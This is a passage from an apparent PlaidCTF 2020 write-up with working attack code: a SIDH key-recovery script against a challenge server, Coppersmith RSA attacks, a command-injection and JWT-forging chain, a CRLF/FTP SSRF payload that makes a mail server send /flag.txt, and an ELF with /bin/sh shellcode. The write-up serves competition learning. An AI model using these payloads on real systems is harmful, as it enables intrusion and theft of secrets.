_sage_const_8 = Integer(8); _sage_const_256 = Integer(256); _sage_const_31337 = Integer(31337); _sage_const_31 = Integer(31); _sage_const_41 = Integer(41); _sage_const_16 = Integer(16); _sage_const_100 = Integer(100)
from Crypto.Cipher import AES

e2 = _sage_const_0xD8 
e3 = _sage_const_0x89 
p = (_sage_const_2 **e2)*(_sage_const_3 **e3)-_sage_const_1 
K = GF(p**_sage_const_2 , modulus=x**_sage_const_2 +_sage_const_1 , names=('ii',)); (ii,) = K._first_ngens(1)
E = EllipticCurve(K, [_sage_const_0 ,_sage_const_6 ,_sage_const_0 ,_sage_const_1 ,_sage_const_0 ])
xP20 = _sage_const_0x00003CCFC5E1F050030363E6920A0F7A4C6C71E63DE63A0E6475AF621995705F7C84500CB2BB61E950E19EAB8661D25C4A50ED279646CB48 
xP21 = _sage_const_0x0001AD1C1CAE7840EDDA6D8A924520F60E573D3B9DFAC6D189941CB22326D284A8816CC4249410FE80D68047D823C97D705246F869E3EA50 
yP20 = _sage_const_0x0001AB066B84949582E3F66688452B9255E72A017C45B148D719D9A63CDB7BE6F48C812E33B68161D5AB3A0A36906F04A6A6957E6F4FB2E0 
yP21 = _sage_const_0x0000FD87F67EA576CE97FF65BF9F4F7688C4C752DCE9F8BD2B36AD66E04249AAF8337C01E6E4E1A844267BA1A1887B433729E1DD90C7DD2F 
xQ20 = _sage_const_0x0000C7461738340EFCF09CE388F666EB38F7F3AFD42DC0B664D9F461F31AA2EDC6B4AB71BD42F4D7C058E13F64B237EF7DDD2ABC0DEB0C6C 
xQ21 = _sage_const_0x000025DE37157F50D75D320DD0682AB4A67E471586FBC2D31AA32E6957FA2B2614C4CD40A1E27283EAAF4272AE517847197432E2D61C85F5 
yQ20 = _sage_const_0x0001D407B70B01E4AEE172EDF491F4EF32144F03F5E054CEF9FDE5A35EFA3642A11817905ED0D4F193F31124264924A5F64EFE14B6EC97E5 
yQ21 = _sage_const_0x0000E7DEC8C32F50A4E735A839DCDB89FE0763A184C525F7B7D0EBC0E84E9D83E9AC53A572A25D19E1464B509D97272AE761657B4765B3D6 
xP30 = _sage_const_0x00008664865EA7D816F03B31E223C26D406A2C6CD0C3D667466056AAE85895EC37368BFC009DFAFCB3D97E639F65E9E45F46573B0637B7A9 
xP31 = _sage_const_0x00000000 
yP30 = _sage_const_0x00006AE515593E73976091978DFBD70BDA0DD6BCAEEBFDD4FB1E748DDD9ED3FDCF679726C67A3B2CC12B39805B32B612E058A4280764443B 
yP31 = _sage_const_0x00000000 
xQ30 = _sage_const_0x00012E84D7652558E694BF84C1FBDAAF99B83B4266C32EC65B10457BCAF94C63EB063681E8B1E7398C0B241C19B9665FDB9E1406DA3D3846 
xQ31 = _sage_const_0x00000000 
yQ30 = _sage_const_0x00000000 
yQ31 = _sage_const_0x0000EBAAA6C731271673BEECE467FD5ED9CC29AB564BDED7BDEAA86DD1E0FDDF399EDCC9B49C829EF53C7D7A35C3A0745D73C424FB4A5FD2 
P2 = E(xP20+ii*xP21, yP20+ii*yP21)
Q2 = E(xQ20+ii*xQ21, yQ20+ii*yQ21)
P3 = E(xP30+ii*xP31, yP30+ii*yP31)
Q3 = E(xQ30+ii*xQ31, yQ30+ii*yQ31)

def elem_to_coefficients(x):
    l = x.polynomial().list()
    l += [_sage_const_0 ]*(_sage_const_2 -len(l))
    return l

def elem_to_bytes(x):
    n = ceil(log(p,_sage_const_2 )/_sage_const_8 )
    x0,x1 = elem_to_coefficients(x) # x == x0 + ii*x1
    x0 = ZZ(x0).digits(_sage_const_256 , padto=n)
    x1 = ZZ(x1).digits(_sage_const_256 , padto=n)
    return bytes(x0+x1)

def isogen3(sk3):
    Ei = E 
    P = P2
    Q = Q2
    S = P3+sk3*Q3
    for i in range(e3):
        phi = Ei.isogeny((_sage_const_3 **(e3-i-_sage_const_1 ))*S)
        Ei = phi.codomain()
        S = phi(S)
        P = phi(P)
        Q = phi(Q)
    return (Ei,P,Q)

def isoex3(sk3, pk2):
    Ei, P, Q = pk2 
    S = P+sk3*Q
    for i in range(e3):
        R = (_sage_const_3 **(e3-i-_sage_const_1 ))*S
        phi = Ei.isogeny(R)
        Ei = phi.codomain()
        S = phi(S)
    return Ei.j_invariant()

def isogen2(sk2):
    Ei = E
    P = P3
    Q = Q3
    S = P2+sk2*Q2
    for i in range(e2):
        phi = Ei.isogeny((_sage_const_2 **(e2-i-_sage_const_1 ))*S)
        Ei = phi.codomain()
        S = phi(S)
        P = phi(P)
        Q = phi(Q)
    return (Ei,P,Q)

def isoex2(sk2, pk3):
    Ei, P, Q = pk3
    S = P+sk2*Q
    for i in range(e2):
        R = (_sage_const_2 **(e2-i-_sage_const_1 ))*S
        phi = Ei.isogeny(R)
        Ei = phi.codomain()
        S = phi(S)
    return Ei.j_invariant()

supersingular_cache = set()
def is_supersingular(Ei):
    a = Ei.a_invariants()
    if a in supersingular_cache:
        return True
    result = Ei.is_supersingular(proof=False)
    if result:
        supersingular_cache.add(a)
    return result


## start connecting

import socket, hashlib, random, string, subprocess

REMOTE_ADDR = ("149.28.9.162", _sage_const_31337 )
#REMOTE_ADDR = ('localhost', 31337)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(REMOTE_ADDR)
sockf = sock.makefile()

## ----------------------- POW -----------------------
pow_line = sockf.readline().strip()
prefix = pow_line[_sage_const_31 :_sage_const_41 ]
print('Prefix:', prefix)
suf = 'aaaaaaaa'
while not hashlib.sha256((prefix + suf).encode('latin1')).hexdigest().endswith('fffffff'):
    suf = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(_sage_const_8 )])
answer = prefix + suf
#answer = subprocess.check_output(['./pow', prefix]).strip()
print('Answer:', answer)
sock.sendall((answer + '\n').encode('latin1'))
## ----------------------------------------------------

def recv_K_elem(line):
    re, im = line[line.find('[')+_sage_const_1 :line.find(']')].split(',')
    re = ZZ(re)
    im = ZZ(im)
    return K(re + ii*im)

print('start')
line = sockf.readline() # public key:
print(line)
line = sockf.readline() # a1
a1 = recv_K_elem(line)
line = sockf.readline() # a2
a2 = recv_K_elem(line)
line = sockf.readline() # a3
a3 = recv_K_elem(line)
line = sockf.readline() # a4
a4 = recv_K_elem(line)
line = sockf.readline() # a6
a6 = recv_K_elem(line)
Ei = EllipticCurve(K, [a1,a2,a3,a4,a6])
assert(is_supersingular(Ei))

line = sockf.readline() # Px
Px = recv_K_elem(line)
line = sockf.readline() # Py
Py = recv_K_elem(line)
P = Ei(Px, Py)
line = sockf.readline() # Qx
Qx = recv_K_elem(line)
line = sockf.readline() # Qy
Qy = recv_K_elem(line)
Q = Ei(Qx, Qy)
assert(P*(_sage_const_2 **e2) == Ei(_sage_const_0 ) and P*(_sage_const_2 **(e2-_sage_const_1 )) != Ei(_sage_const_0 ))
assert(Q*(_sage_const_2 **e2) == Ei(_sage_const_0 ) and Q*(_sage_const_2 **(e2-_sage_const_1 )) != Ei(_sage_const_0 ))
pk3 = (Ei, P, Q)

print('recved')

#debug
#oracle=sockf.readline()
#print('oracle',oracle)

def send_K_elem(coef):
    line = sockf.readline() # prompt
    sockf.read(len("  re: "))
    sock.sendall(str(coef[_sage_const_0 ]).encode('latin1')+b'\n')
    sockf.read(len("  im: "))
    sock.sendall(str(coef[_sage_const_1 ]).encode('latin1')+b'\n')

# gen key
sk2 = randint(_sage_const_1 , _sage_const_2 **e2-_sage_const_1 )
pk2 = isogen2(sk2)

FF = IntegerModRing(_sage_const_3 **e3)

R = pk2[_sage_const_1 ]
S = pk2[_sage_const_2 ]
shared = isoex2(sk2, pk3)
key = hashlib.sha256(elem_to_bytes(shared)).digest()
print('key',key.hex())

K = _sage_const_0 
for i in range(e3-_sage_const_2 ):
    alpha = _sage_const_0 
    theta = Integer(FF((_sage_const_1  + _sage_const_3 **(e3 - i - _sage_const_1 ))**-_sage_const_1 ).sqrt())
    for j in [_sage_const_1 ,_sage_const_2 ]:
        Rprime = theta * (R - (K * _sage_const_3 **(e3 - i - _sage_const_1 ) + j * _sage_const_3 **(e3-_sage_const_1 )) * S)
        Sprime = theta * (_sage_const_1  + _sage_const_3 **(e3 - i - _sage_const_1 )) * S
        # send pub
        line = sockf.readline() # input your ...
        send_K_elem(elem_to_coefficients(pk2[_sage_const_0 ].a1()))
        send_K_elem(elem_to_coefficients(pk2[_sage_const_0 ].a2()))
        send_K_elem(elem_to_coefficients(pk2[_sage_const_0 ].a3()))
        send_K_elem(elem_to_coefficients(pk2[_sage_const_0 ].a4()))
        send_K_elem(elem_to_coefficients(pk2[_sage_const_0 ].a6()))
        send_K_elem(elem_to_coefficients(Rprime[_sage_const_0 ]))
        send_K_elem(elem_to_coefficients(Rprime[_sage_const_1 ]))
        send_K_elem(elem_to_coefficients(Sprime[_sage_const_0 ]))
        send_K_elem(elem_to_coefficients(Sprime[_sage_const_1 ]))

        cipher = AES.new(key, AES.MODE_ECB)

        ciphertext = cipher.encrypt(b"Hello world.\x00\x00\x00\x00")
        line = sockf.read(len("ciphertext: "))
        if line != "ciphertext: ":
            print('sth wrong')
            exit()
            
        sock.sendall((ciphertext.hex()+'\n').encode('latin1'))
        line = sockf.readline()
        if line.startswith('Good '):
            alpha = j
            break

    K += alpha*_sage_const_3 **i
    print(i,'get',K)
    
print(K)

sk3 = -_sage_const_1 
for i in range(_sage_const_3 ):
    for j in range(_sage_const_3 ):
        candk = K + i*_sage_const_3 **(e3-_sage_const_2 ) + j*_sage_const_3 **(e3-_sage_const_1 )
        E3, _, _ = isogen3(candk)
        if E3.j_invariant() == Ei.j_invariant():
            sk3 = candk
            break
    if sk3 != -_sage_const_1 :
        break

if sk3 == -_sage_const_1 :
    print("sadly failed")
    exit()

print('all done!')
super_secret_hash = hashlib.sha256(str(sk3).encode('ascii')).digest()[:_sage_const_16 ]
line = sockf.readline() # input your ...
send_K_elem(elem_to_coefficients(pk2[_sage_const_0 ].a1()))
send_K_elem(elem_to_coefficients(pk2[_sage_const_0 ].a2()))
send_K_elem(elem_to_coefficients(pk2[_sage_const_0 ].a3()))
send_K_elem(elem_to_coefficients(pk2[_sage_const_0 ].a4()))
send_K_elem(elem_to_coefficients(pk2[_sage_const_0 ].a6()))
send_K_elem(elem_to_coefficients(pk2[_sage_const_1 ][_sage_const_0 ]))
send_K_elem(elem_to_coefficients(pk2[_sage_const_1 ][_sage_const_1 ]))
send_K_elem(elem_to_coefficients(pk2[_sage_const_2 ][_sage_const_0 ]))
send_K_elem(elem_to_coefficients(pk2[_sage_const_2 ][_sage_const_1 ]))

cipher = AES.new(key, AES.MODE_ECB)
ciphertext = cipher.encrypt(super_secret_hash)
line = sockf.read(len("ciphertext: "))
    
sock.sendall((ciphertext.hex()+'\n').encode('latin1'))
for _ in range(_sage_const_100 ):
    line = sockf.readline()
    print(line)

```

### dyrpto

We have RSA ciphertext of two related messages, with small random paddings. This is standard case for coppersmith. I was able to find a script online and modify it to calculate the exact diff, then recover plaintext with gcd

```
def short_pad_attack(c1, c2, e, n):
    PRxy.<x,y> = PolynomialRing(Zmod(n))
    PRx.<xn> = PolynomialRing(Zmod(n))
    PRZZ.<xz,yz> = PolynomialRing(Zmod(n))

    g1 = x^e - c1
    g2 = (x+0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000L+y)^e - c2

    q1 = g1.change_ring(PRZZ)
    q2 = g2.change_ring(PRZZ)

    h = q2.resultant(q1)
    h = h.univariate_polynomial()
    h = h.change_ring(PRx).subs(y=xn)
    h = h.monic()

    kbits = n.nbits()//(2*e*e)
    diff = h.small_roots(X=2^kbits, beta=0.5)[0]  # find root < 2^kbits with factor >= n^0.5

    return diff

def related_message_attack(c1, c2, diff, e, n):
    PRx.<x> = PolynomialRing(Zmod(n))
    g1 = x^e - c1
    g2 = (x+diff)^e - c2

    def gcd(g1, g2):
        while g2:
            g1, g2 = g2, g1 % g2
        return g1.monic()

    return -gcd(g1, g2)[0]


if __name__ == '__main__':
    c1 = 0x314193fd72359213463d75b4fc6db85de0a33b8098ba0ba98a215f246e7f6c4d17b59abb7e4ceb824d7310056d6574b13956f1b3d1ac868b72f6b98508b586566d71474da72c2ae4d3273c80757d0160f703ca0b14a0504509d92d4c09a733feae349a5b512fdcea46574a29b8507c60b5c49edd7641b19f98845688c38fc67a35432653140cbb5abc17d3c32f3720e4549797877ca9cae61aa75df936e41200906729a0dac3b7b18289681dbaf4a3bfdf9a3acf2efac8c5e5f873ede32ccbfcae438bd813601f4fe5290f2b999d988f3d0f423d76a6ae8a5dee2dd17aa7996e8f96fe9c76ac379f6dabb6def2dc05c8561fad1722706736aba8a20385d2054e1929682157f1d201b22a224aafb6004164f3325124279e16c99471a341b88300bd0161cdeca4b9d92bf761a0ed74c2b151a62d10c4b0cdbd3e8f657f76f3ac88430a4a89ab4a913d9a55dae150b6e42df6e161382055782c0ff05e635fb2e50e826f08440266dc60ca081b1d17c18145c6d45a1fa0bb439428e4796346bc912e897897dc47097d0047b28e0ff1e52ea27726ce444b1287b250ed5a43a2e84c37cba4c2e39b5c389d671c0ea0639d3a2c6092cc1ee50e35c810eb5d053190d7594c52995ac95b7889a61d2afe7d6dc33b0e13ab4eddd791f01a11b336549154bb894b5afc0dcc5b5b4ce9f162f423b7dd80ce70a73ddbda0333c12eeea408e97c
    c2 = 0x0b9bbdf92c4c5099708b911813737e3f17ef3d554bceb65d2681b377a2c5bdb8f1c634602bda2ec9b2b7b6f894f1592c944865594740e9fd139d07db9d309a93d2a33ec3a0455acf083bc02fd8e1f685804ecefe7d55462847c93badf44464f55a0fa6a8fc8aae839630efc00aaee30c9ad2a5b8f4410141bb17b29f312e2e1c2c963324776e7ea7ca90d717661a86d7da8f4cb6a72be1b8f979974032667733d3db07f528cb086f81edafe0a8ec28d890455fc8f382a79193e3d04284b9d0b13d181159191e8cd6401a592c464538a0145a88f8f2e5522ccc4aa3cf2779c2efe4d0dcb501f75011e063a4713eb3067a85761d79ed359db4a038fe2369f3b0d7aab29fd65aeabc3c408bbbfe9a03954d8a9af955d61e853b15183137bfb2654fc41aa9aaad6d4c68a6a034373e9600805ed0ab7a77c0ac9199d549c26c8bfa43ea449d45fe924fe728a98bc3f6575d8710012065ce72fc0fdea4e81b438fbd31afc4733bb15bc4d11cf103e89923bf04ff336c53c536a9456e8751233f8be29166e4a7982689988983bd351f875feea46a7a9875005f76e2e24213a7e6cc3456c22a9813e2b75cba3b1a282d6ab207e4eddba46992104a2ae4ccb2f5b6f728f42ae2f0a06e91c8772971e4169a5ee891d12465f673c3264b5619d5e05d97ee4d8da63fe9e9633af684fdf5193e47bf303621c2f5be35ef1e20f282c4d83bf03e
    e = 3
    n = 647353081512155557435109029192899887292162896024387438380717904550049084072650858042487538260409968902476642050863551118537014801984015026845895208603765204484721851898066687201063160748700966276614009722396362475860673283467894418696897868921145204864477937433189412833621006424924922775206256529053118483685827144126396074730453341509096269922609997933482099350967669641747655782027157871050452284368912421597547338355164717467365389718512816843810112610151402293076239928228117824655751702578849364973841428924562822833982858491919896776037660827425125378364372495534346479756462737760465746815636952287878733868933696188382829432359669960220276553567701006464705764781429964667541930625224157387181453452208309282139359638193440050826441444111527140592168826430470521828807532468836796445893725071942672574028431402658126414443737803009580768987541970193759730480278307362216692962285353295300391148856280961671861600486447754303730588822350406393620332040359962142016784588854071738540262784464951088700157947527856905149457353587048951604342248422901427823202477854550861884781719173510697653413351949112195965316483043418797396717013675120500373425502099598874281334096073572424550878063888692026422588022920084160323128550629

    #diff = short_pad_attack(c1, c2, e, n)
    #print("difference of two messages is %d" % diff)
    diff = 0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 - 1753729384994569894086803306005739859719058324621317061480

    m1 = related_message_attack(c1, c2, diff, e, n)
    print(m1)
```

### MPKC

Just implement the attack method in https://eprint.iacr.org/2020/053.pdf.
Ugly **Sage** code without any optimization:
```python
from itertools import product
from multiprocessing import Process

q, n, a, s = (3, 59, 10, 25)
m = n + 1 - a + s

FF = GF(q)
R = PolynomialRing(FF, ["x{}".format(i) for i in range(n)])
xs = R.gens()

(x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30, x31, x32, x33, x34, x35, x36, x37, x38, x39, x40, x41, x42, x43, x44, x45, x46, x47, x48, x49, x50, x51, x52, x53, x54, x55, x56, x57, x58) = xs

P = # public key

D = # cipher

dic =[i * j for i in xs for j in xs]
length = len(dic)
cnt = 0

M = []
for i in range(len(P)):
    t = [0] * length
    for k, j in list(P[i]):
        if j in dic:
            t[dic.index(j)] = k
    M.append(t)
M = matrix(FF, M)
a = M.left_kernel().basis()

for _ in range(len(D)):
    print 'try %d' %_
    d = D[_]
    R = []
    X = []
    dic2 = [i for i in xs]
    length2 = len(dic2)

    for i in range(len(a)):
        rp = 0
        rv = 0
        for j in range(len(a[i])):
            rp += a[i][j] * P[j]
            rv += a[i][j] * d[j]
        t = [0] * length2
        for k, j in list(rp):
            if j not in dic2:
                rv -= k
            else:
                t[dic2.index(j)] = k
        X.append(rv)
        R.append(t)

    RR = matrix(FF, R)
    XX = matrix(FF, X).transpose()
    fff = RR.solve_right(XX)
    KER = matrix(FF, RR.right_kernel().basis())
    
    def worker(startv):
        print 'start %d' %startv
        cnt = 0
        for _ in product([0, 1, 2], repeat = 10):
            if cnt < startv:
                cnt += 1
                continue
            if cnt > startv:
                break
            mul = matrix(FF, _)
            f_pos = (mul * KER).transpose() + fff
            pos = list(f_pos.transpose()[0])
            if all(int(P[j](pos)) == d[j] for j in range(len(d))):
                print 'find!!!'
                print pos
                print cnt
                fi = open('result.txt', 'a+')
                fi.write(str(pos) + '\n')
                fi.close()
                break
            cnt += 1
            if cnt % 1000 == 0:
                print cnt

    jobs = []
    pro_num = 8
    for i in range(pro_num):
        startv = 3 ** 10 // pro_num * i
        p = Process(target = worker, args = (startv, ))
        jobs.append(p)
        p.start()
    map(lambda p: p.join(), jobs)
```
Then we can get the flag:
```python
x = [
[1, 0, 0, 2, 0, 1, 1, 2, 1, 1, 0, 2, 0, 1, 0, 2, 0, 2, 2, 0, 0, 0, 2, 0, 1, 1, 2, 1, 0, 2, 1, 2, 1, 2, 2, 1, 1, 1, 0, 0, 1, 2, 1, 0, 0, 2, 1, 2, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0],
[1, 0, 0, 2, 1, 1, 2, 1, 2, 2, 1, 2, 2, 2, 2, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 2, 0, 2, 0, 1, 1, 1, 2, 1, 1, 2, 2, 1, 2, 1, 2, 0, 1, 0, 0, 2, 1, 1, 1, 1, 0, 2, 2, 2, 0],
[1, 2, 0, 2, 2, 2, 2, 0, 0, 1, 1, 1, 2, 1, 2, 2, 0, 0, 1, 0, 0, 2, 0, 0, 2, 2, 1, 2, 1, 2, 0, 1, 2, 1, 2, 1, 0, 0, 2, 0, 0, 2, 0, 2, 1, 0, 1, 1, 1, 0, 0, 2, 1, 2, 0, 2, 2, 1, 0],
[1, 1, 1, 2, 0, 1, 2, 0, 1, 1, 1, 2, 2, 2, 1, 1, 0, 1, 1, 1, 0, 1, 0, 2, 1, 0, 0, 2, 0, 1, 0, 0, 0, 2, 0, 0, 0, 2, 0, 1, 2, 2, 0, 0, 1, 0, 1, 2, 1, 0, 1, 2, 2, 1, 0, 2, 0, 1, 0],
[2, 0, 0, 1, 2, 0, 0, 1, 2, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 2, 1, 1, 1, 0, 2, 0, 1, 2, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 2, 1, 0, 2, 1, 0, 2, 2, 0, 2, 2, 0, 2, 2, 0, 0, 1, 1, 1],
[1, 2, 2, 1, 0, 1, 1, 2, 1, 0, 1, 1, 0, 2, 2, 1, 2, 2, 1, 1, 1, 1, 1, 2, 1, 1, 1, 1, 2, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
]
q = 3
def combine_blocks(blocks):
    x = 0
    for i in blocks[::-1]:
        for j in i[::-1]:
            x = x*q+j
    ss = ""
    while x > 0:
        ss = chr(x % 256) + ss
        x = x//256
    return ss

print combine_blocks(x)
#PCTF{D1d_y0u_kn0w_Sage_h4S_MuLTiVar1at3_P0lynoMiaL_SeQu3NCe5?_:o}
```

## Web

### Mooz Chat

1. find command injection in upload profile via reverse binary
2. `ls /` found `/start.sh`
3. `cat /start.sh` fail
4. try `od -j 10000 -N 1000 -c /start.sh` success
5. got `export JWT_KEY='Pl4idC7F2020'`
6. found `messages` api need `tomnook`
7. sign `tomnook` 's jwt token with JWT_KEY
8. access messages api with `tomnook`'s token
9. found flag in first message

### Contrived Web Problem
1. Find a CRLF injecton in `/api/image?url`, we can use this CRLF injection to control FTP server
2. in mail server, it get message from rabbitmq and send mail with nodemailer, which can send attached file using `path`
 ![](https://hackmd.sinku.me/uploads/upload_e307210ad8dc15400b92afef0717f538.png)
![](https://hackmd.sinku.me/uploads/upload_9a1329bafaebfc962a97cef6ac98ec6c.png)

3. so we can let ftp server send a post request to rabbitmq web management in order to add a evil message, the post request:

```
POST /api/exchanges/%2F/amq.default/publish HTTP/1.0
Host: 127.0.0.1:15672
Content-Length: 333
authorization: Basic dGVzdDp0ZXN0
x-vhost: 
Content-Type: text/plain;charset=UTF-8
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7
Connection: close

{"vhost":"/","name":"amq.default","properties":{"delivery_mode":1,"headers":{}},"routing_key":"email","delivery_mode":"1","payload":"{\r\n            \"to\":\"123456@ctf.com\",\r\n            \"subject\": \"Password Reset\",\r\n            \"text\": {\"path\":\"/flag.txt\"}\r\n        }","headers":{},"props":{},"payload_encoding":"string"}
```

4. but first we should upload the HTTP request data to ftp server, request `api/image?url=ftp://ftp:21/user/e95f0769-05c7-4da2-b74c-53210ad8b650/profile.png%250d%250aPASV%250d%250aPORT+192,168,1,11,14,178%250d%250a%250d%250aSTOR+/user/e95f0769-05c7-4da2-b74c-53210ad8b650/profile.png` this payload used FTP active mode to upload the request data to the server.
6. last send following request, let ftp server send post request to rabbitmq-management
```
GET /api/image?url=ftp://ftp:21/user/e95f0769-05c7-4da2-b74c-53210ad8b650/profile.png%250d%250aPASV%250d%250aREST+0%250d%250aPORT+172,32,56,72,61,56%250d%250a%250d%250aRETR+/user/e95f0769-05c7-4da2-b74c-53210ad8b650/profile.png HTTP/1.1
Host: 127.0.0.1:8080
```
7. mail server get message from rabbitmq and send /flag.txt to our mailbox

## Misc

### file-system-based strcmp go brrr
1. Load the file as a disk image in winhex.
2. `strings` the file, we find something like `MATCH` `NOMATCH` `HAHA`, etc.
3. Search `MATCH` in winhex, then the flag appears. 

![](https://hackmd.sinku.me/uploads/upload_236ce649b4063c3be74e541fa3acf970.png)

### .dangit

Open the website, we could find a .git/ directory exposed publicly. We used [Githack](https://github.com/BugScanTeam/GitHack) to dump the repository, but couldn't find anything useful about the flag. After that we went back to the challenge description, which says `While many fine clients exist, only two deserve to be called porcelains`. We did a quick search on the Internet and then found a git client for emacs, [Magit](https://magit.vc/).

Searching for possible paths under .git, we found the [WIP function](https://magit.vc/manual/magit/Wip-Modes.html), which tracks uncommited files and saves them to the repo. This led us to `refs/wip/index/refs/heads/master` and `refs/wip/wtree/refs/heads/master`. The latter contains the hidden information about the flag.

`PCTF{looks_like_you_found_out_about_the_wip_ref_which_magit_in_emacs_uses}`

### Bonzi Scheme

the challenge provides us an acs file, and we can upload a new acs file to the server. when uploaded, the server will replace ACSCHARACTERINFO->LOCALIZEDINFO_List[0] with flag, so we modify pointer in ACSCHARACTERINFO->LOCALIZEDINFO_List[0] to middle of ACSCHARACTERINFO->Color_Table, when flag is written to this region, the color palette of the acs will be overwritten. the resulting image will also be affected. we download the 0th frame from the modified acs file and diff between the original image and affected image will reveal the flag.

```python
from PIL import Image
import struct

def map_color_to_coordinates(imagefile):
    image = Image.open(imagefile)
    c2c = dict()
    width, height = image.size
    for i in xrange(width):
        for j in xrange(height):
            color = image.getpixel((i, j))
            if color in c2c:
                continue
            c2c[color] = (i, j)
    return c2c

def get_bonz_color_table(bonzfile, ctbloff, ctblcnt):
    bonz = open(bonzfile, 'rb').read()
    bonz = bonz[ctbloff:ctbloff + ctblcnt * 4]
    ctbl = list()
    for i in xrange(ctblcnt):
        b, g, r, _ = map(ord, bonz[i * 4:i * 4 + 4])
        ctbl.append((r, g, b))
    return ctbl

def get_color_lcs(bonz_ctbl, c2ctbl):
    lcs_length = 0
    lcs_offset = 0
    cur_length = 0
    cur_offset = 0
    for i in xrange(len(bonz_ctbl)):
        if bonz_ctbl[i] in c2ctbl:
            cur_length += 1
        else:
            if cur_length > lcs_length:
                lcs_length = cur_length
                lcs_offset = cur_offset
            cur_length = 0
            cur_offset = i + 1
    return lcs_offset, lcs_length

def patch_bonz(input, output, pctbl_off):
    bonz = open(input, 'rb').read()
    ptr_addr = 0x500d0a
    data = ('\x01\x00\x90\x00\x00\x00\x00\x00\x08\x00\x00\x00\x31\x00'
            '\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00'
            '\x00\x00\x00\x00\x00\x00')
    data_addr = pctbl_off - 0xc
    bonz = bonz[:data_addr] + data + bonz[data_addr + len(data):]
    bonz = bonz[:ptr_addr] + struct.pack('<I', data_addr) + bonz[ptr_addr + 4:]
    open(output, 'wb').write(bonz)

def image_to_flag(imagefile, bonz_ctbl, c2ctbl, lcsoff):
    image = Image.open(imagefile)
    index = lcsoff
    flags = []
    while '}' not in flags:
        pixel_coordiante = c2ctbl[bonz_ctbl[index]]
        r, g, b = image.getpixel(pixel_coordiante)
        flags.append(chr(b))
        flags.append(chr(r))
        index += 1
    flags = flags[:flags.index('}') + 1]
    flag = ''.join(flags)
    return flag

flag_len = 80
bonz_ctbl_offset = 0x500dae
bonz_ctbl_count = 256

c2ctbl = map_color_to_coordinates('original.bmp')
bonz_ctbl = get_bonz_color_table('bonz.acs', bonz_ctbl_offset, bonz_ctbl_count)
lcsoff, lcslen = get_color_lcs(bonz_ctbl, c2ctbl)
assert(lcslen > (flag_len / 2))
bonz_patch_offset = bonz_ctbl_offset + lcsoff * 4
patch_bonz('bonz.acs', 'bonz_patched.acs', bonz_patch_offset)

print 'upload file and get patched image'

flag = image_to_flag('patched.bmp', bonz_ctbl, c2ctbl, lcsoff)
print flag
```

### golf.so
For the 1st chall, it accepts a so within 300 bytes. Since Normal compiling method won't be helpful in this situation, we have to create a raw so manually.

For a runnable so, it should contains at least 3 essential components: 
* elf header
* segment header(1 PT_LOAD + 1 DYNAMIC)
* Dynamic segment. 

For Dynamic segment, it should contain DT_SYMTAB and DT_STRTAB items, and ends with DT_NULL. For space saving, we can leave the DYNAMIC segment at the end of SO file. It could be helpful to save some `\x00` bytes in file. ld with load this file and map a whole page for the first segment, padding much zero bytes at the end of file content in memory. For example, it looks like:

```python
# without saved
dynamic = p64(DT_INIT) + p64(entry)
dynamic += p64(DT_SYMTAB) + p64(0)
dynamic += p64(DT_STRTAB) + p64(0)
dynamic += p64(DT_NULL) + p64(0)

# saved
dynamic = p64(DT_INIT) + p64(entry)
dynamic += p64(DT_SYMTAB) + p64(0)
dynamic += chr(DT_STRTAB & 0xff)
```

we can save `7+8+8+8` bytes here.

If without any more tricks, the goal is tranformed to achieve a condition that `64 + 56*2 + shellcode + 33 < 300`.

With a short shellcode, it's easy to build a so file to get 1st flag.

```
   0:   6a 3b                   push   0x3b
   2:   58                      pop    rax
   3:   99                      cdq
   4:   52                      push   rdx
   5:   48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
   c:   73 68 00
   f:   53                      push   rbx
  10:   54                      push   rsp
  11:   5f                      pop    rdi
  12:   52                      push   rdx
  13:   57                      push   rdi
  14:   54                      push   rsp
  15:   5e                      pop    rsi
  16:   0f 05                   syscall
```


### golf.so2
Now we have to save more bytes to get the 2nd flag. 

As elf section is useless at runtime, we could use section related field in elf header to hold some other data, for example, our shellcode.

But some fields in header can not be touch during loading. 

```C
typedef struct
{
  unsigned char e_ident[EI_NIDENT]; /* Hardcodz */
  Elf64_Half    e_type;         /* Hardcodz */
  Elf64_Half    e_machine;      /* Hardcodz */
  Elf64_Word    e_version;      /* Hardcodz */
  Elf64_Addr    e_entry;        /* useless */
  Elf64_Off e_phoff;        /* useful */
  Elf64_Off e_shoff;        /* useless */
  Elf64_Word    e_flags;        /* useless */
  Elf64_Half    e_ehsize;       /* uesless */
  Elf64_Half    e_phentsize;        /* Hardcodz */
  Elf64_Half    e_phnum;        /* useful */
  Elf64_Half    e_shentsize;        /* useless */
  Elf64_Half    e_shnum;        /* useless */
  Elf64_Half    e_shstrndx;     /* useless */
} Elf64_Ehdr;

```

